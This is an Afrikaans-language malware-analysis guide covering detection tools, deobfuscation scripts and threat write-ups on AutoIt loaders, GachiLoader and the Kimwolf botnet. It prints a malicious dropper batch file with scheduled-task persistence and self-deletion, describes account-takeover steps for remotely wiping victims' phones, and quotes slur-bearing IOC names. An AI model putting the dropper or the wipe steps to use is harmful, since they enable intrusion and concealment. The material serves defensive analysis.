# Malware-analise

{{#include ../../banners/hacktricks-training.md}}

## Forensiese CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Aanlyn Dienste

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Aflyn Antivirus- en Opsporingshulpmiddels

### Yara

#### Installeer
```bash
sudo apt-get install -y yara
```
#### Berei die rules voor

Gebruik hierdie skrip om alle yara malware rules vanaf github af te laai en saam te voeg: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Skep die _**rules**_ gids en voer dit uit. Dit sal 'n lêer met die naam _**malware_rules.yar**_ skep wat al die yara rules vir malware bevat.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Scan
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Kontroleer vir malware en Skep reëls

Jy kan die hulpmiddel [**YaraGen**](https://github.com/Neo23x0/yarGen) gebruik om yara rules van 'n binary te genereer. Kyk na hierdie handleidings: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installeer
```
sudo apt-get install -y clamav
```
#### Skandering
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** identifiseer moontlik kwaadwillige **vermoëns** in uitvoerbare lêers: PE, ELF, .NET. Dit sal byvoorbeeld dinge soos Att\&ck-taktieke of verdagte vermoëns vind, soos:

- kontroleer vir OutputDebugString-fout
- bedryf as 'n diens
- skep proses

Get it int he [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC beteken Aanwyser van Kompromittering. 'n IOC is 'n stel **toestande wat identifiseer** sommige moontlik ongewenste sagteware of bevestigde **malware**. Blue Teams gebruik hierdie soort definisie om **te soek na hierdie soort kwaadwillige lêers** in hul **sisteme** en **netwerke**.\
Om hierdie definisies te deel is baie nuttig, want wanneer malware in 'n rekenaar geïdentifiseer word en 'n IOC daarvoor geskep word, kan ander Blue Teams dit gebruik om die malware vinniger te identifiseer.

'n hulpmiddel om IOCs te skep of te wysig is [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Jy kan gereedskap soos [**Redline**](https://www.fireeye.com/services/freeware/redline.html) gebruik om **na gedefinieerde IOCs op 'n toestel te soek**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) is 'n skandeerder vir eenvoudige Aanwysers van Kompromittering.\
Deteksie is gebaseer op vier detectiemetodes:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) is 'n malware-skandeerder vir Linux wat vrygestel is onder die GNU GPLv2-lisensie, wat ontwerp is rondom die bedreigings wat in gedeelde gehoste omgewings voorkom. Dit gebruik bedreigingsdata van network edge intrusion detection systems om malware uit te trek wat aktief in aanvalle gebruik word en genereer signatures vir opsporing. Daarbenewens word bedreigingsdata ook afgelei van gebruikersinskrywings met die LMD checkout feature en malware community resources.

### rkhunter

Gereedskap soos [**rkhunter**](http://rkhunter.sourceforge.net) kan gebruik word om die lêerstelsel te kontroleer vir moontlike **rootkits** en malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) is 'n hulpmiddel wat sal probeer om obfuscated strings binne executables te vind deur verskillende tegnieke te gebruik.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) kontroleer 'n paar basiese dinge binne die executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) is 'n hulpmiddel wat toelaat om inligting oor Windows executables te kry soos imports, exports, headers, maar sal ook virus total nagaan en potensiële Att\&ck techniques vind.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) is 'n hulpmiddel om te bepaal of 'n lêer **encrypted** is en ook **packers** te vind.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is 'n Python-skrip wat 'n verskeidenheid van **statistical methods** gebruik om **obfuscated** en **encrypted** inhoud binne teks/script-lêers te detecteer. Die beoogde doel van NeoPI is om te help met die **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) doen sy uiterste bes om **obfuscated**/**dodgy code** te detecteer asook lêers wat **PHP** funksies gebruik wat gereeld in **malwares**/webshells gebruik word.

### Apple Binary Signatures

Wanneer jy 'n **malware sample** nagaan, moet jy altyd die **check the signature** van die binary doen aangesien die **developer** wat dit gesign het dalk reeds **related** met **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Opsporingstegnieke

### File Stacking

As jy weet dat 'n gids wat die **files** van 'n web server bevat **laastens op 'n sekere datum bygewerk is**. **Check** die **date** waarop al die **files** in die **web server geskep en gewysig is** en as enige datum **suspicious** is, check daardie file.

### Basislyne

As die files van 'n gids **nie gewysig moes gewees het nie**, kan jy die **hash** van die **oorspronklike files** van die gids bereken en dit **compare** met die **current**. Enigiets wat gewysig is sal **suspicious** wees.

### Statistiese Analise

Wanneer die inligting in logs gestoor word, kan jy **statistieke nagaan**, soos hoeveel keer elke file van 'n web server geraak is — 'n web shell kan moontlik een van die mees-toegangs files wees.

---

### Android in-app native telemetry (no root)

Op Android kan jy native kode binne die teiken-app-proses instrumenteer deur 'n klein logger-biblioteek voor te laai voordat ander JNI libs initialise. Dit gee vroeë sigbaarheid in native gedrag sonder stelsel-wye hooks of root. 'n Populêre benadering is SoTap: plaas libsotap.so vir die regte ABI in die APK en inject 'n System.loadLibrary("sotap") oproep vroeg (bv. static initializer of Application.onCreate), en versamel dan logs van interne/eksterne paaie of Logcat fallback.

Sien die Android native reversing bladsy vir opstelbesonderhede en log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Sommige Android malware en RASP-beskermde apps verberg JNI method names en signatures deur dit tydens runtime te decodeer voordat RegisterNatives aangeroep word. Wanneer Frida/ptrace instrumentering deur anti-debug gekill word, kan jy steeds die plaintext offline recover deur die in-binary decoder met angr uit te voer en dan die resultate terug te push in Ghidra as kommentaar.

Belangrike idee: behandel die decoder binne die .so as 'n callable function, voer dit uit op die geobfusceerde byte blobs in .rodata, en concretize die uitvoerbytes tot by die eerste \x00 (C-string terminator). Hou angr en Ghidra op dieselfde image base om address mismatches te vermy.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr opstelling en offline decoder-uitvoering</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Op groot skaal, bou 'n statiese kaart van call sites na die decoder se argumente (encoded_ptr, size). Wrappers kan argumente wegsteek, daarom kan jy hierdie kaart handmatig uit Ghidra xrefs skep as API recovery onbetroubaar is.

<details>
<summary>Dekodeer verskeie call sites saam met angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Aanteken aanroepplekke in Ghidra
Opsie A: Slegs Jython-opmerking-skrywer (gebruik 'n vooraf berekende JSON)
- Aangesien angr CPython3 vereis, hou deobfuskasie en aantekening geskei. Voer eers die angr-skrip hierbo uit om decoded_strings.json te genereer. Voer vervolgens hierdie Jython GhidraScript uit om PRE_COMMENTs by elke aanroepplek te skryf (en sluit die aanroeperfunksienaam vir konteks in):

<details>
<summary>Ghidra Jython-skrip om gedekodeerde JNI-strings aan te teken</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Enkele CPython-skrip via pyhidra/ghidra_bridge
- Alternatiewelik, gebruik pyhidra of ghidra_bridge om Ghidra’s API te bestuur vanuit dieselfde CPython-proses wat angr uitvoer. Dit laat toe om decode_string() aan te roep en onmiddellik PRE_COMMENTs te stel sonder 'n tussentydse lêer. Die logika weerspieël die Jython-skrip: bou 'n callsite→function-kaart via ReferenceManager, dekodeer met angr, en stel kommentaar.

Waarom dit werk en wanneer om dit te gebruik
- Offline-uitvoering omseil RASP/anti-debug: geen ptrace, geen Frida-hooks benodig om strings te herstel nie.
- Deur Ghidra en angr se base_addr te belyn (bv. 0x00100000) verseker jy dat funksie-/data-adresse ooreenstem oor die gereedskap heen.
- Herhaalbare resep vir decoders: behandel die transformasie as 'n suiwer funksie, ken 'n uitsetbuffervoorraad toe in 'n vars state, roep dit aan met (encoded_ptr, out_ptr, len), concretiseer dan via state.solver.eval en parse C-strings tot by \x00.

Notas en valkuils
- Respekteer die teiken-ABI/calling convention. angr.factory.callable kies een gebaseer op arch; as argumente geskuiwe lyk, spesifiseer cc eksplisiet.
- As die decoder nul-geïnitialiseerde uitsetbuffers verwag, inisialiseer outbuf met nulles in die state voor die oproep.
- Vir position-independent Android .so, voorsien altyd base_addr sodat adresse in angr ooreenstem met dié wat in Ghidra gesien word.
- Gebruik currentProgram.getReferenceManager() om call-xrefs te enumereer selfs al verpak die app die decoder agter dun stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Moderne malware-families misbruik Control-Flow Graph (CFG) obfuscation swaar: in plaas van 'n direkte jump/call bereken hulle die bestemming tydens uitvoering en voer 'n `jmp rax` of `call rax` uit. 'n Klein *dispatcher* (tipies nege instruksies) stel die finale teiken afhangende van die CPU `ZF`/`CF` flags, wat statiese CFG-herwinning heeltemal breek.

Die tegniek – gedemonstreer deur die SLOW#TEMPEST loader – kan gekeer word met 'n drie-stap werkstroom wat slegs op IDAPython en die Unicorn CPU emulator staatmaak.

### 1. Lokaliseer elke indirekte jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Onttrek die dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuleer dit twee keer met Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Voer `run(code,0,0)` en `run(code,1,1)` uit om die *onwaar* en *waar* branch targets te kry.

### 4. Patch terug 'n direkte jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Na patching, dwing IDA om die funksie weer te analiseer sodat die volle CFG- en Hex-Rays-uitset herstel word:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Etiketteer indirekte API-oproepe

Sodra die werklike bestemming van elke `call rax` bekend is, kan jy vir IDA sê wat dit is sodat parameter-tipes & veranderlike name outomaties herstel word:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktiese voordele

* Herstel die werklike CFG → decompilation gaan van *10* lyne na duisende.
* Maak string-cross-reference & xrefs moontlik, wat gedragreconstructie triviaal maak.
* Skripte is herbruikbaar: plaas dit in enige loader wat deur dieselfde truuk beskerm word.

---

## AutoIt-gebaseerde loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Hierdie indringingspatroon koppel 'n ondertekende MSI, AutoIt loaders wat na .a3x saamgestel is, en 'n Task Scheduler job wat hom as 'n goedaardige app voordoen.

### MSI → custom actions → AutoIt orchestrator

Prosesboom en opdragte wat uitgevoer word deur die MSI custom actions:

- MsiExec.exe → cmd.exe om install.bat uit te voer
- WScript.exe om 'n lokfout-dialoog te vertoon
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, sets persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (lokmiddel vir gebruiker):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Sleutelartefakte en vermomming:
- Kopieer AutoIt3.exe en IoKlTr.au3 na C:\Users\Public\Music
- Kopieer schtasks.exe na hwpviewer.exe (vermom as Hangul Word Processor viewer)
- Skep 'n geskeduleerde taak "IoKlTr" wat elke 1 minuut uitgevoer word
- Opstart-LNK gesien as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Plaas modules onder %APPDATA%\Google\Browser\ subgidse wat `adb` of `adv` bevat, en begin dit via autoit.vbs/install.bat hulpskripte

Forensiese triage wenke:
- schtasks-ontleding: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Soek na hernoemde kopieë van schtasks.exe wat saam met Task XML voorkom: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Algemene paaie: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korreleer proseskreatie: AutoIt3.exe wat legitieme Windows-binaries lanceer (bv. cleanmgr.exe, hncfinder.exe)

### AutoIt laaiers en .a3x payload ontsleuteling → inspuiting

- AutoIt-modules word saamgestel met `#AutoIt3Wrapper_Outfile_type=a3x` en ontsleutel ingebedde payloads voordat hulle in benigne prosesse ingespuit word.
- Waargenome families: QuasarRAT (ingespuit in hncfinder.exe) en RftRAT/RFTServer (ingespuit in cleanmgr.exe), sowel as RemcosRAT-modules (`Remcos\RunBinary.a3x`).
- Ontsleutelmuster: lei 'n AES-sleutel af via HMAC, ontsleutel die ingebedde blob, en inspuit dan die onversleutelde module.

Generiese ontsleutelskelet (presiese HMAC-invoer/algoritme is familie-spesifiek):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (gesuspendeer) van die teiken-host (bv., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory met gedekripteerde module/shellcode
- CreateRemoteThread of QueueUserAPC om die payload uit te voer

Hunting ideas
- AutoIt3.exe met ouer MsiExec.exe of WScript.exe wat stelselhulpmiddels opstart
- Lêers met `.a3x` uitbreidings of AutoIt-script-runners onder publieke/gebruiker-skryfbare paaie
- Verdagte scheduled tasks wat AutoIt3.exe uitvoer of binaries wat nie deur Microsoft geteken is nie, met minuutvlak-triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Tydens die Windows-inbrake het operators gesteelde Google-credentials gebruik om die slagoffer se Android-toestelle herhaaldelik te vee, en sodoende kennisgewings te onderdruk terwyl hulle toegang uitbrei via die slagoffer se aangemelde desktop-messenger.

Operator-stappe (uit 'n aangemelde browser-sessie):
- Gaan Google Account → Security → Your devices na; kies Find My Phone → Find Hub (https://www.google.com/android/find)
- Kies toestel → voer Google-wagwoord weer in → gee die opdrag "Erase device" (fabrieksherstel); herhaal om herstel te vertraag
- Opsioneel: vee waarskuwing-e-posse in die gekoppelde posbus uit (bv., Naver) om sekuriteitskennisgewings te verberg

## Tracing heavily obfuscated Node.js loaders

Aanvallers pak toenemend JavaScript-loaders binne standalone Windows-binaries saam wat met [`nexe`](https://github.com/nexe/nexe) saamgestel is, sodat die runtime saam met die script gelewer word. Die resulterende PE weeg dikwels 60–90 MB en voer uit selfs al is Node.js nie geïnstalleer nie. Tydens triage:

- Gebruik [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) om die ingeslote JavaScript uit die PE te kerf en dit aan plaaslike gereedskap vir statiese diffing te voer.
- Verwacht 'n skyf-gebaseerde mutex in `%TEMP%` (GachiLoader skep 'n ewekansige `<name>.lock`-lêer wat na ~5 minute verstryk). Deur die lêer voor uitvoering na die sandbox te kopieer kan jy oorbodige stadiums oorslaan terwyl jy steeds later payloads sien.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooks core modules binne enige Node.js-proses, laat jou spoof anti-VM probes, en bewaar elke artefak wat die sample skryf. Start geobfuskeerde scripts deur die tracer om analist-beheerde instrumentasie in die oproepstapel te hou:
```powershell
node -r .\tracer.js main.js
```
Belangrike konfigurasieskakelaars in `tracer.js` laat jou toe om:

- Log lêerstelsel-, child-process-, en HTTP-aktiwiteit (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Elke gedropte lêer—soos `kidkadi.node`—word na die werkgids gekopieer voordat die malware dit uitvee.
- Oorskryf omgewing-vingerafdrukke deur realistiese RAM/CPU-tellinge terug te gee, die uitvoer van `tasklist` te vervals, en PowerShell/WMI-antwoorde te manipuleer. Dit omseil loaders wat ≥4 GB RAM, ≥2 kerne vra, en gebruikername (`mashinesssss`, `wdagutilityaccount`, ens.), hostnames (`desktop-vrsqlag`, `server1` …), en prosesname (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) ondersoek.
- Neutraliseer WMI-hardwarekontroles soos `Get-WmiObject Win32_DiskDrive` (soek na `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blokkeer “VirtualBox Graphics Adapter”, “Hyper-V Video”, ens.) en `Win32_PortConnector`-tellinge. Wanneer daardie probes “werklike” hardeware rapporteer, beland sandboxes nie meer in die oneindige lus van goedaardige `Invoke-WebRequest`-oproepe na `linkedin.com`, `grok.com`, `whatsapp.com` en soortgelyke domeine wat GachiLoader gebruik om analise tyd te vermors nie.

### Outomatiese vaslegging van gated C2-verkeer

Die tracer se netwerk-hooke openbaar meerlaagse C2-verifikasie sonder om die JavaScript-obfuskasie te reverseer. In die waargenome veldtog doen die loader:

1. POSTs host-telemetrie na `/log` op elke hardgecodeerde C2.
2. Voer `GET /richfamily/<per-sample key>` uit met `X-Secret: gachifamily` om 'n Base64-gekodeerde payload-URL te kry.
3. Voer 'n finale `GET` na daardie URL uit met 'n lang per-sample `X-Secret`-header; as dit ontbreek, gee dit `403 Forbidden` terug.

Omdat die tracer volledige versoeke (headers, liggame, bestemmings) opteken, kan jy dieselfde verkeer herlei om payloads te trek, Themida/VMProtect-shells in geheue te dump, en Rhadamanthys-konfigurasiedata op skaal te onttrek.

## AdaptixC2: Konfigurasie-onttrekking en TTPs

Sien die toegewyde bladsy:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf Android-botnet Handelstegnieke

### APK-loader & native ELF-uitvoering op TV-bokse
- Kwaadaardige APKs soos `com.n2.systemservice06*` bevat 'n staties gekoppelde ARM ELF binne `res/raw` (bv. `R.raw.libniggakernel`). 'n `BOOT_COMPLETED`-ontvanger loop by opstart, onttrek die raw resource na die app-sandbox (bv. `/data/data/<pkg>/niggakernel`), maak dit uitvoerbaar en roep dit aan met `su`.
- Baie Android TV-bokse/tablette word met pre-rooted images of 'n world-writable `su` gelewer, sodat die loader die ELF betroubaar met UID 0 laai selfs sonder 'n exploit-ketting. Persistensie kom “vir vry” omdat die ontvanger na elke herbegin of app-herlaai weer gelanceer word.
- Reverse engineers wat hierna soek, kan `AndroidManifest.xml` diff om verborge boot-ontvangers en kode wat na `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")` verwys, te vind. Sodra die ELF gedrop is, behandel dit as 'n Linux userland backdoor (Kimwolf is UPX-packed, stripped, statically linked, 32-bit ARM EABI5).

### Runtime mutexes & maskerende IOCs
- By start bind Kimwolf 'n **abstract UNIX domain socket** soos `@niggaboxv4`/`@niggaboxv5`. Bestaande sockets dwing 'n afsluiting, so die socket-naam funksioneer as beide 'n mutex en 'n forensiese artefak.
- Die proses-opschrift word oorskryf met service-agtige name (`netd_services`, `tv_helper`, ens.) om in Android-proseslyste in te meng. Gastgebaseerde deteksies kan waarsku op hierdie name gekombineer met die mutex-socket.

### Stapel XOR-string-dekodering met ARM NEON + flare_emu
- Sensitiewe strings (C2-domeine, resolvers, DoT-endpunte) word op die stapel gedruk in geënkripteerde 8-byte blokke en in plek gedekodeer via `VEOR Qx, Qx, Qy` (`veorq_s64`). Ontleders kan **flare_emu** skryf om die gedekodeerde pointer te vang elke keer as die dekodeerder dit aan die caller oorhandig:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
if eh.isValidEmuPtr(argv[1]):
print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- Soek na `VEOR Q8, Q8, Q9` / `veorq_s64`-reekse en deur hul reekse te emuleer word elke ontsleutelde string massaal uitgehaal, wat die stack-only lewensduur van die platteks omseil.

### DNS-over-TLS resolusie plus XOR IP-afleiding
- Alle Kimwolf-variante los C2-domeine op deur direk met **DNS-over-TLS (TCP/853)** met Google (8.8.8.8) of Cloudflare (1.1.1.1) te kommunikeer, wat plain DNS logging of hijacking omseil.
- v4 bots gebruik eenvoudig die teruggegewe IPv4 A-record. v5 bots behandel die A-record as 'n 32-bit integer, ruil sy endianness, XOR dit met die konstante `0x00ce0491`, en draai dan die endianness terug om die werklike C2-IP te bekom. CyberChef recipe: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding fallback
- Later builds voeg 'n ENS-domein (`pawsatyou.eth`) by waarvan die resolver-tekssleutel `"lol"` 'n skynbaar onskadelike IPv6 (`fed0:5dec:...:1be7:8599`) stoor.
- Die bot gryp die laaste vier bytes (`1b e7 85 99`), XOR dit met `0x93141715`, en interpreteer die resultaat as 'n IPv4 C2 (`136.243.146.140`). Deur die ENS-tekstrekord te verander roteer die downstream C2s onmiddellik via die blockchain sonder om DNS aan te raak.

### TLS + ECDSA geverifieerde bevelkanaal
- Verkeer word in wolfSSL ingekapsel met 'n pasgemaakte framed-protokol:
```go
struct Header {
Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
Reserved uint8   // 0x01
MsgType  uint8   // verb
MsgID    uint32
BodyLen  uint32
CRC32    uint32
}
```
- Bootstrap: die bot stuur twee leë `MsgType=0 (register)` headers. Die C2 antwoord met `MsgType=1 (verify)` wat 'n ewekansige uitdaging plus 'n ASN.1 DER **ECDSA** handtekening bevat. Bots verifieer dit teen 'n ingebedde SubjectPublicKeyInfo blob; mislukkings beëindig die sessie en verhoed hijacked/sinkholed C2 nodes om die vloot te taak.
- Sodra geverifieer, stuur die bot 'n `MsgType=0` body wat die deur die operateur gedefinieerde **group string** dra (bv. `android-postboot-rt`). As die group geaktiveer is, antwoord die C2 met `MsgType=2 (confirm)`, waarna tasking (MsgType 5–12) begin.
- Ondersteunde verbs sluit in SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write, en **Mirai-compatible DDoSBody** payloads (dieselfde `AtkType`, `Duration`, `Targets[]`, `Flags[]` uitleg).

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
